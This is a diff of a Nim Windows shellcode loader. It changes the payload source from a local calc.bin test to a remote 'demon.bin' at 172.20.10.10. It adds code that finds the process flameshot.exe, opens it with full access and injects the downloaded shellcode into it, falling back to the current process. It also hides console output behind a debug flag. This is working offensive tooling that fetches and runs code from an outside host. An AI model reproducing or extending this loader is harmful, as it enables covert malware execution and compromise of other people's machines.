@@ -2,22 +2,76 @@ import winim, strformat, strutils, httpclient, streams
 
 # Status indicators
 template success(s: varargs[untyped]): untyped = 
-    echo "[+] ", s
+    when DEBUG:
+        echo "[+] ", s
 template fail(s: varargs[untyped]): untyped = 
-    echo "[-] ", s
+    when DEBUG:
+        echo "[-] ", s
 template info(s: varargs[untyped]): untyped =
-    echo "[*] ", s
+    when DEBUG:
+        echo "[*] ", s
+template debug(s: varargs[untyped]): untyped =
+    when DEBUG:
+        echo "[>] ", s
 
-const url = "http://127.0.0.1:9090/calc.bin"
+const DEBUG = true
+const url = "http://172.20.10.10/demon.bin"
+const target = "flameshot.exe"
+
+proc GetPIDByName(process: string) : DWORD =
+    var pid: DWORD
+
+    # Create snapshot
+    var snapshot : HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    var process: PROCESSENTRY32W
+    ZeroMemory(&process, sizeof(PROCESSENTRY32W))
+    process.dwSize = cast[DWORD](sizeof(process))
+
+    # Iterate over processes
+    while Process32NextW(snapshot, &process) != 0:
+        var processName: string = ""
+        for c in process.szExeFile:
+            if c == 0:
+                break
+            processName.add(char((int)c))
+        
+        if processName == target:
+            debug("Found process: ", process.szExeFile, ", PID: ", process.th32ProcessID)
+            pid = process.th32ProcessID
+    
+    # Close snapshot handle
+    CloseHandle(snapshot)
+
+    return pid
 
 proc run() : int = 
-    # GetCurrentProcess: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
-    info("Getting handle to current process")
-    var pHandle = GetCurrentProcess() 
-    if pHandle == 0:
-        fail("Failed to get handle to current process: ", GetLastError())
-        return ERROR
-    success(fmt"> Got handle to current process: {pHandle}")
+    
+    var pHandle: HANDLE
+    
+    # Get PID of target process
+    info(fmt"Getting PID of {target}")
+    var pid = GetPIDByName(target)
+    if pid == 0:
+        fail(fmt"Failed to get PID of {target}. Check if the process is running.")
+        info(fmt"Using current process instead.")
+
+        # GetCurrentProcess: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
+        info("Getting handle to current process")
+        pHandle = GetCurrentProcess() 
+        if pHandle == 0:
+            fail("Failed to get handle to current process: ", GetLastError())
+            return ERROR
+        success(fmt"> Got handle to current process: {pHandle}")
+    else: 
+        success(fmt"> Got PID to process {target}: {pid}")
+
+        # OpenProcess: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
+        info(fmt"Getting handle to process {target}")
+        pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
+        if pHandle == 0:
+            fail(fmt"Failed to get handle to process {target}: ", GetLastError())
+            return ERROR
+        success(fmt"> Got handle to process {target}: {pHandle}")
 
     # Fetch shellcode from remote web server
     info(fmt"Fetching payload from {url}")
@@ -27,16 +81,6 @@ proc run() : int =
         return ERROR
     var shellcode = response.bodyStream.readAll()
     success(fmt"> Read {shellcode.len} bytes from {url}")
-
-    # Read shellcode from file 
-    # var file = "../data/calc.bin"
-    # var strm = newFileStream(file, fmRead)
-    # info(fmt"Reading shellcode from file {file}")
-    # if strm == nil:
-    #     fail("Failed to open shellcode file: ", GetLastError())
-    #     return ERROR
-    # var shellcode = strm.readAll()
-    # success(fmt"> Read {shellcode.len} bytes from file {file}")
 
     # VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
     info("Allocating memory in process")
